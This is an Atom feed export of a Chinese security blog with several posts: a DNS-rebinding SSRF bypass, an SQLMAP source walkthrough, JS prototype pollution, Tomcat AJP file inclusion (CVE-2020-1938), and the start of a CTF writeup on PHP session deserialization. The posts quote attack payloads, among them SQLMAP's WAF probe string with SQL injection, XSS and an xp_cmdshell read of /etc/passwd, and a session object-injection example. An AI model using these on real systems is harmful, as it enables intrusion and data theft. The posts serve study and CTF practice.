alt></p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP。</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证。</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li></ul><blockquote><p>攻击点就在于<strong>第二次</strong>服务端发出请求时，我们能通过短时间的ttl来修改返回的地址。因为验证url的操作是在第一步那里，我们给他响应一个外网ip，所以我们能绕过验证。<strong>由于ttl为0，DNS解析结果缓存时间很短</strong>，服务器第二次要请求url的时候就会<strong>重新解析</strong>域名，那这次我们就给他响应个内网ip，就能成功绕过SSRF限制发出到内网的请求了。</p></blockquote><ul><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>DNSlog真的是一个好用的东西，各种无回显漏洞通过搭配发出请求域名的命令就能通过log形式来看到回显的结果。要好好的利用总结。</p><p>参考链接：</p><p> <a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a> </p><p> <a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNSlog注入&quot;&gt;&lt;a href=&quot;#DNSlog注入&quot; class=&quot;headerlink&quot; title=&quot;DNSlog注入&quot;&gt;&lt;/a&gt;DNSlog注入&lt;/h1&gt;&lt;p&gt;emmm，就写一写DNS log注入吧。有挺多利用方式的，都是为了盲打的效果。只要能在漏洞上
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQLMAP源码分析</title>
    <link href="http://bai-ren-1.github.io/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://bai-ren-1.github.io/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-03-18T06:05:37.000Z</published>
    <updated>2020-04-01T10:43:25.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLMAP源码分析"><a href="#SQLMAP源码分析" class="headerlink" title="SQLMAP源码分析"></a>SQLMAP源码分析</h1><p>实验室面试经典面题，既然科班出身，肯定得好好钻研一下这些工具源码然后自己写或者拓展。</p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>环境没啥好说的，直接拿自己刚入门时下载的SQLMAP和VSCode一把梭。</p><h2 id="0x01-入口定位"><a href="#0x01-入口定位" class="headerlink" title="0x01 入口定位"></a>0x01 入口定位</h2><p>因为我们使用SQLMAP都是用python指定执行sqlmap.py这个文件，所以没啥好说的，就是从他开始分析。</p><p>直接定位到他的入口函数。可以看到他用异常处理模块写的，那就直接跟进try模块，分析他的调用情况。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt></p><p>emmm，确实写的太具体了，在主方法中还定义了各种异常处理模块。看名称大概就是SQLMAP用户退出异常、SQLMAP的shell异常、SQLMAP基本异常、键盘输入异常和EOF等，暂时先不看吧。</p><p>看他的主模块，我们继续跟进主方法里面的try模块：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt></p><p>进到try模块一看就舒服多了，我把最下面的if模块收起来，整个try模块就和清晰明了。很明显一进入了try就执行了这四个处理函数，并且下面的多次使用了 cmdLineOptions、conf变量。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3.png" alt></p><h3 id="函数dirtyPatches"><a href="#函数dirtyPatches" class="headerlink" title="函数dirtyPatches"></a>函数dirtyPatches</h3><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3-1.png" alt></p><p>这个函数很明显是在做一些声明和初始化操作：</p><ul><li>声明了httplib的最大值MAXLINE的值</li><li>如果是Windows系统则导入ip地址转换函数模块</li><li>如果字符编码是cp65001则转换为utf-8 </li></ul><blockquote><p>当然这里有个好玩的地方就是他的转换是通过写lambda表达式写的：</p><p>lambda作为一个表达式，定义了一个匿名函数，上例的代码name为参数，name为cp65001则转utf-8 </p></blockquote><h3 id="函数checkEnvironment"><a href="#函数checkEnvironment" class="headerlink" title="函数checkEnvironment"></a>函数checkEnvironment</h3><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3-2.png" alt></p><p>很贴切函数名，这里就是在做一些环境的检查操作：</p><ul><li>检查模块的路径是否可以找到，拒绝奇怪的编码</li><li>检查python的版本，太老就gg了</li><li>从lib.core.data中导入三个全局变量 <code>conf、kb、cmdLineOptions</code>，有点意思了</li><li>从lib.core.exception中导入几个异常处理类</li></ul><h3 id="函数setPaths"><a href="#函数setPaths" class="headerlink" title="函数setPaths"></a>函数setPaths</h3><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/4.png" alt></p><p>这个函数太长啦，下面还有部分函数，我没截图。大概功能也很明显：就是把各类资源路径加载进去。里面可以看到了包括了<code>WAF、SHELL和各类TXT</code>的路径</p><h4 id="函数banner"><a href="#函数banner" class="headerlink" title="函数banner"></a>函数banner</h4><p>banner信息，没啥好说的，下面继续。</p><h3 id="跟进initOptions"><a href="#跟进initOptions" class="headerlink" title="跟进initOptions"></a>跟进initOptions</h3><p>继续我们的流程，往下走。跟进initOptions函数中。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/5.png" alt></p><p>其中setConfAttributes（配置属性）<code>设置了conf的各项属性</code>：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/6.png" alt></p><blockquote><p>Tips：这里就直接快速查看就行啦，没必要跟进进去。</p></blockquote><p>第二个setKnowledgeBaseAttributes（知识库属性）<code>设置了kb的各项属性</code>：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/7.png" alt></p><p>第三个不说了。这个总的函数initOptions意义在于<code>设置了conf和kb</code>这两个经常会遇到的全局变量的属性，我们可以在这里快速定位到相关信息。下面继续跟进main中的try模块。</p><h3 id="跟进try模块"><a href="#跟进try模块" class="headerlink" title="跟进try模块"></a>跟进try模块</h3><p>继续在try模块跟踪，现在可以展开if模块了（终于），很清晰的看到在init初始化后就开始进入主程序中：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/8.png" alt></p><p>跟进下init发现都是初始操作，这里就不写了。然后他会调用两种测试：smokeTest和liveTest对SQLMAP的功能进行测试。测试完就会导入start方法了，终于看到曙光了。</p><h2 id="0x02-start方法"><a href="#0x02-start方法" class="headerlink" title="0x02 start方法"></a>0x02 start方法</h2><p>vscode直接选中start然后右键“转到定义”，就能直接到了start方法声明的地方：lib/controller/controller.py。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/9.png" alt></p><blockquote><p>稍微翻译一下函数说明：这个函数调用对每个URL是否稳定进行检查，并且对所有的GET，POST，Cookie和User-agent参数检查检查是否可用并且会受SQL注入影响。</p></blockquote><p>可以看到一开始还是通过上一章中初始化出来的conf全局变量进行检查，懒得多说。直接进行到for循环里面进行分析。</p><h3 id="分析循环结构"><a href="#分析循环结构" class="headerlink" title="分析循环结构"></a>分析循环结构</h3><p>现在就可以安心的分析循环中的try模块。第一步我们就看到了打印出检查网络连接状况的消息，不得不说SQLMAP真的考虑的很周全。</p><p>如果不能连通，就输出错误信息。连不通就一直….下去。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/10.png" alt></p><p>第二步就开始给conf变量进行赋值。赋值了目标URL，请求方法，请求数据，cookie各类http请求头。然后下面好多配置的东西哟例如<code>parseTargetUr</code>l和<code>setupTargetEnv</code>等，我真服了，直接看到<code>checkWaf</code>函数吧。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/11.png" alt></p><h2 id="0x03-start中的checkWaf"><a href="#0x03-start中的checkWaf" class="headerlink" title="0x03 start中的checkWaf"></a>0x03 start中的checkWaf</h2><p>OK，这个可以看出他先检查了一下该目标是否有检测过Waf，没有的话就会开始检查Waf。简略的看一下就如同下图：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/12.png" alt></p><p>随后就会初始化两个变量，一个是<code>retVal=0</code>，用于标识是否存在Waf。另一个是<code>payload</code>，由随机数字和内置payload组合而成。</p><blockquote><p>SQLMAP内置的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u&apos;5856 AND 1=1 UNION ALL SELECT 1,NULL,&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(\&apos;cat ../../../etc/passwd\&apos;)#&apos;</span><br></pre></td></tr></table></figure></blockquote><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/13.png" alt></p><p>可以看出首先根据两种请求方式，分别构造出 <code>随机字符参数 = 刚刚组合而成的payload</code> 形式的请求参数，然后把我们的目标的信息写入<code>kb</code>中。</p><p>然后通过<code>queryPage</code>发送，假如出现SQLMAP连接错误，则说明存在Waf，把retVal设置为1并进入下面的if中。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/14.png" alt></p><p>if中很明显就是打印出存在Waf并且简单和你交互是否继续检查。并把该网站存在Waf写进db中。</p><blockquote><p>下一次检查Waf就能直接判断这个网站有Waf，即开头检查的那部分，这也是SQLMAP厉害之处。</p></blockquote><h3 id="queryPage"><a href="#queryPage" class="headerlink" title="queryPage"></a>queryPage</h3><p>那么，在上面的流程中，我们能大概断定他关于Waf的判断存在于<code>queryPage</code>这一句，我们仔细看一下。其实上图中我截图并不完全，完整的语句如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = Request.queryPage(place=place, value=value, getRatioValue=<span class="literal">True</span>, noteResponseTime=<span class="literal">False</span>, silent=<span class="literal">True</span>, disableTampering=<span class="literal">True</span>)[<span class="number">1</span>] &lt; IDS_WAF_CHECK_RATIO</span><br></pre></td></tr></table></figure><p>首先这里retVal是由一个判断式子来决定的，若后面式子为真，则为1；否则为0。如下图所示：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/16.png" alt></p><p>其中<code>IDS_WAF_CHECK_RATIO</code>的值为0.5，这个是什么呢？首先介绍diff模块：</p><blockquote><p>difflib模块是在 SQLMAP 中用来计算页面的相似度的基础模块，实际处理的时候，SQLMAP 并不仅仅是直接计算页面的相似度，而是通过首先对页面进行一些预处理，预处理之后，根据预设的阈值来计算请求页面和模版页面的相似度。实际使用中，最多的方法应该就是 <code>ratio()</code>。 </p></blockquote><p>关于ratio的用法如下图所示：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/18.png" alt></p><p>现在我们知道了SQLMAP使用的判断页面相似的方法，我们就继续回到原来的判断Waf的语句中。</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/15.png" alt></p><p>这个式子代表，只要加上了payload发送的请求和正常发送的请求的相似度只要小于0.5，就会被判定为存在Waf。</p><p>OK，那我们看看queryPage的函数说明：</p><p><img src="/2020/03/18/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/17.png" alt></p><blockquote><p>此方法调用函数来获取目标URL的页面内容并返回其相似度（0&lt;=相似度&lt;=1）或者返回一个代表获取不了相似度的布尔值。</p></blockquote><p>到此我们就把checkWaf的基本轮廓描述了一遍，下面做一个简单的总结：</p><blockquote><p>checkWaf先检查原有数据中是否存在目标网址的Waf信息。若不存在Waf信息，则初始化敏感payload并拼接成参数形式。不同的请求方法（GET/POST）就把上面内容插入不同的地方。然后SQLMAP发送请求，并通过difflib库判断加上参数后与原来是否相似度小于0.5，如果是，则返回存在Waf。打印出相应信息并返回主流程。</p></blockquote><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>我去，写了这么久，还比较浅显才到了检查Waf这一步。后面再把后面内容补上来吧，太多了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQLMAP源码分析&quot;&gt;&lt;a href=&quot;#SQLMAP源码分析&quot; class=&quot;headerlink&quot; title=&quot;SQLMAP源码分析&quot;&gt;&lt;/a&gt;SQLMAP源码分析&lt;/h1&gt;&lt;p&gt;实验室面试经典面题，既然科班出身，肯定得好好钻研一下这些工具源码然后自己写或
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JS原型污染链</title>
    <link href="http://bai-ren-1.github.io/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/"/>
    <id>http://bai-ren-1.github.io/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/</id>
    <published>2020-03-17T06:08:27.000Z</published>
    <updated>2020-03-24T09:08:40.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS原型污染链"><a href="#JS原型污染链" class="headerlink" title="JS原型污染链"></a>JS原型污染链</h1><p>JS中一种很有意思的漏洞，利用了JS中原型的特性，特此记录。</p><p>在正式进入之前先说一下chrome下如何清除console下面的历史记录。首先固定住console，然后ctrl+shift+j组合键再调出另一个console，随后选中application并清理里面local storge。随后关闭console并刷新即可。</p><h2 id="0x00-类的声明"><a href="#0x00-类的声明" class="headerlink" title="0x00 类的声明"></a>0x00 类的声明</h2><p>JS在ECS6之前没有类的概念，之前的类都是用funtion来声明的 。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/3.png" alt></p><p>由上图可以看到，我先定义了一个Shabi类，并且类中具有属性name。随后实例化一个对象shabi，可以看到对象shabi中也具有了类Shabi中的属性a。</p><blockquote><p>通过new实例化对象即是通过构造方法来实例化对象。</p></blockquote><p>当然我们也能这么来写，定义了TestShabi类并实例化testshabi对象：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/2.png" alt></p><p>同样也能在对象中得到类中的属性，出现这个情况的原因是JS的继承特性，与之相关的就涉及到了原型链。</p><h2 id="0x01-原型链"><a href="#0x01-原型链" class="headerlink" title="0x01 原型链"></a>0x01 原型链</h2><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/1.png" alt></p><p>根据上面的图，我们就能知道了类、对象、原型对象、原型类等基本概念和关系，下面通过做一个实验来验证。</p><h2 id="0x02-实验探究"><a href="#0x02-实验探究" class="headerlink" title="0x02 实验探究"></a>0x02 实验探究</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在JS中只有类才有prototype属性，而对象却没有，对象有的是__proto__，它和类的prototype对应。且二者是等价的，都指向了对应的原型对象。</span><br></pre></td></tr></table></figure><p>根据上面的原型链的原理图，我声明了A类，然后实例化一个对象a。在类中有一个属性prototype，在实例化对象中有个属性<code>__proto__</code>，他们都指向了A的原型对象：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/4.png" alt></p><blockquote><p>原型对象是个对象，上例即为A.prototype，具体内容{constructor:f}，该原型对象只有一个构造方法。</p></blockquote><p>随后我们跟进这个原型对象A.prototype，因为他是一个原型对象（即对象类型），于是他也会具有他的原型对象即<code>A.prototype.__proto__</code>。我们直接点开属性列表，就可以看到他的原型对象（原型对象A.protype的原型对象，对应上图中的Object.prototype）：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/6.png" alt></p><p>我们也可以通过这样来验证：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/5.png" alt></p><p>最后我们看Object.prototype可以看到它的原型对象为空，至此整条原型链完毕：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/7.png" alt></p><blockquote><p>原型链 ：a -&gt; A.prototype -&gt; Object.protype -&gt; null</p></blockquote><h2 id="0x03-原型链污染"><a href="#0x03-原型链污染" class="headerlink" title="0x03 原型链污染"></a>0x03 原型链污染</h2><h3 id="1-属性污染"><a href="#1-属性污染" class="headerlink" title="1) 属性污染"></a>1) 属性污染</h3><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/8.png" alt></p><p>上图就是一个简单的对原型链进行属性的污染。首先我们定义一个shabi类，它里面没有属性。然后我们实例化一个a对象，可以看到他是一个空对象。</p><p>那如果我们对a的原型对象进行操作呢？上面我给a的原型对象加了一个name属性，并赋值。可以看到，在“污染”了原型对象后，我再重新实例化b对象。虽然b对象也是空对象，但是因为原型链和被“污染”的原型对象的存在，它可以输出name属性。至此，就是一个简单的原型链污染，控制了b对象的name属性。</p><h3 id="2-函数污染"><a href="#2-函数污染" class="headerlink" title="2) 函数污染"></a>2) 函数污染</h3><p>首先看一下JS中的继承。我先定义了一个Shabi作为父类，其中具有方法能输出字符串。随后我定义一个空子类ShabiSon。通过prototype让子类继承父类。此时我实例化一个sona对象，可以看到它因为具有了父类的方法。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/9.png" alt></p><p>那我们就开始操作，给他进行方法的“污染”。实例化对象儿子a即sona很生气，想让其他儿子也变笨。于是我们通过sona对象的<code>__proto__</code>属性指向了父类Shabi，并改写其中的ShowName方法。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/10.png" alt></p><p>可以看到，我们通过改写父类的方法，成功让其他继承了父类的聪明的宝宝变成了shabi。</p><h2 id="0x04-CTF利用"><a href="#0x04-CTF利用" class="headerlink" title="0x04 CTF利用"></a>0x04 CTF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染.</span><br></pre></td></tr></table></figure><p>原型链污染一般会出现在<code>对象或数组</code>的<code>键名或属性名</code>可控,而且是<code>赋值语句</code>的情况下 ：例如<strong>对象合并merge、对象clone</strong>。 </p><p>CTF题目参考链接：</p><p><a href="https://www.freebuf.com/column/216381.html" target="_blank" rel="noopener">https://www.freebuf.com/column/216381.html</a> </p><p><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/200406.html</a> </p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>最近事情太多了，应接不暇。希望早点结束这些麻烦事情，早日轻松，冲冲冲！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JS原型污染链&quot;&gt;&lt;a href=&quot;#JS原型污染链&quot; class=&quot;headerlink&quot; title=&quot;JS原型污染链&quot;&gt;&lt;/a&gt;JS原型污染链&lt;/h1&gt;&lt;p&gt;JS中一种很有意思的漏洞，利用了JS中原型的特性，特此记录。&lt;/p&gt;
&lt;p&gt;在正式进入之前先说一下c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含</title>
    <link href="http://bai-ren-1.github.io/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://bai-ren-1.github.io/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-03-13T07:01:41.000Z</published>
    <updated>2020-03-17T06:07:15.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat文件包含"><a href="#Tomcat文件包含" class="headerlink" title="Tomcat文件包含"></a>Tomcat文件包含</h1><p>漏洞地址：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938</a> ，由于Tomcat处理ajp协议存在缺陷导致攻击者可以构造恶意数据包进行文件包含，获取Tomcat服务器上的文件信息。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里我使用的是ubuntu的docker来搭建我们的Tomcat环境，首先通过docker search找到tomcat具体8.5版本的镜像，然后通过docker pull拉取镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search tomcat-<span class="number">8.5</span>.<span class="number">32</span></span><br><span class="line">docker pull duonghuuphuc/tomcat-<span class="number">8.5</span>.<span class="number">32</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png" alt></p><p>镜像拉取完成后可以通过docker iamges来查看镜像，随后我们运行我们的tomcat镜像。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:8080 -p 8009:8009 --name bairen duonghuuphuc/tomcat-8.5.32</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt></p><p>开启了镜像的8080和8009（处理ajp协议的端口）端口，验证是否开启成功：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" alt></p><p>可以看到nmap成功扫描出目标靶机开启了8009端口处理ajp协议。</p><h2 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h2><p> EXP来源：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a> </p><p>我打完EXP忘记截图了，重新开启一下docker镜像实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start f283f2dd7396</span><br></pre></td></tr></table></figure><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/6.png" alt></p><p>然后执行我们的EXP，可以看到成功读取出/WEB-INF/web.xml的信息：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png" alt></p><p>关闭docker环境：</p><p><img src="/2020/03/13/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png" alt></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>记录一下，用来学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat文件包含&quot;&gt;&lt;a href=&quot;#Tomcat文件包含&quot; class=&quot;headerlink&quot; title=&quot;Tomcat文件包含&quot;&gt;&lt;/a&gt;Tomcat文件包含&lt;/h1&gt;&lt;p&gt;漏洞地址：&lt;a href=&quot;https://cve.mitre.org/cg
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>XCTF之Hackme</title>
    <link href="http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/"/>
    <id>http://bai-ren-1.github.io/2020/03/10/XCTF%E4%B9%8BHackme/</id>
    <published>2020-03-10T08:07:43.000Z</published>
    <updated>2020-03-18T08:14:24.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF之Hackme"><a href="#XCTF之Hackme" class="headerlink" title="XCTF之Hackme"></a>XCTF之Hackme</h1><p>因为疫情在家没事做在写Django的博客。然后刚好Xctf首战新春战疫开始，就看了一下。这道题参考了很多题目比较综合，特此记录。环境已经关闭所以没有源码，核心的绕法和payload的意义会详细解释。最核心考点少于四字的命令执行具体情景和 hitcon 2017类似。</p><p>思路分析</p><p>下载源码审计，看到了可以构造反序列化控制admin的值为1。执行成功反序列化后进入核心题目，核心思路是绕过ssrf后进行一个命令字数小于4的命令执行。</p><h2 id="参考题目"><a href="#参考题目" class="headerlink" title="参考题目"></a>参考题目</h2><p>hitcon 2017 revenge <a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">https://findneo.github.io/171110Bypass4CLimit/</a></p><p>Byte 2019 CTF  <a href="https://blog.csdn.net/a3320315/article/details/102989485/" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102989485/</a> </p><h2 id="Part1-Session反序列化"><a href="#Part1-Session反序列化" class="headerlink" title="Part1 - Session反序列化"></a>Part1 - Session反序列化</h2><blockquote><p> Session反序列化漏洞：在<strong>设置 session 和读取 session 两个阶段</strong>中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。 </p><p>PHP 获取到 session 字符串后，就开始查找<strong>第一个 |</strong>（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。（可利用点：<strong>键值天生就是如果是序列化字符的话，可以直接被反序列。可用来绕过某些构造方法的变量值限定</strong>）</p></blockquote><h4 id="1-PHP-Session-序列化及反序列化处理器"><a href="#1-PHP-Session-序列化及反序列化处理器" class="headerlink" title="1) PHP Session 序列化及反序列化处理器"></a>1) PHP Session 序列化及反序列化处理器</h4><p>PHP 内置了多种处理器用于<strong>存取 $_SESSION 数据</strong>时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize (php&gt;=5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><h4 id="2-配置选项-session-serialize-handler"><a href="#2-配置选项-session-serialize-handler" class="headerlink" title="2) 配置选项 session.serialize_handler"></a>2) 配置选项 session.serialize_handler</h4><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler<span class="string">"php"</span>PHP_INI_ALL</span><br></pre></td></tr></table></figure><h4 id="3-安全隐患"><a href="#3-安全隐患" class="headerlink" title="3) 安全隐患"></a>3) 安全隐患</h4><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure><p>例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"ryat"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure><p>在<strong>读取数据时</strong>如果用的反序列化处理器不是 php_serialize，而<strong>是 php</strong> 的话，那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>ryat<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过注入 <code>|</code> 字符伪造了对象的序列化数据，成功实例化了 